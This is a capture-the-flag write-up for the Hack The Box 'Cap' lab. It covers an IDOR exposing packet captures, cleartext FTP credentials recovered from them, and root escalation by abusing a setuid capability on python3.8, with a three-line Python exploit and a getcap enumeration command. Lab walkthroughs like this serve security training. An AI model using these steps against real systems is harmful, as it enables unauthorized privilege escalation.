---
title: "HTB: Cap"
tags: [htb, linux, easy, capabilities, pcap]
date: 2024-01-01
description: Analyzing PCAP files for credentials and abusing Linux Capabilities (SUID).
---

# Hack The Box: Cap

**Difficulty**: Easy  
**OS**: Linux  

## Reconnaissance
- Web server running a dashboard.
- **IDOR**: `/data/1` shows PCAP data. Changing ID to `/data/0` gives a historical PCAP.
- **Wireshark**: Analysis of PCAP 0 reveals cleartext FTP credentials (`nathan:buckeye`).

## Initial Access
SSH in as `nathan`.

## Privilege Escalation
- Enumeration: `getcap -r / 2>/dev/null`.
- **Finding**: `/usr/bin/python3.8` has `cap_setuid,cap_net_bind_service+ep`.
- **Exploit**: This is effectively SUID.
  ```python
  import os
  os.setuid(0)
  os.system("/bin/bash")
  ```
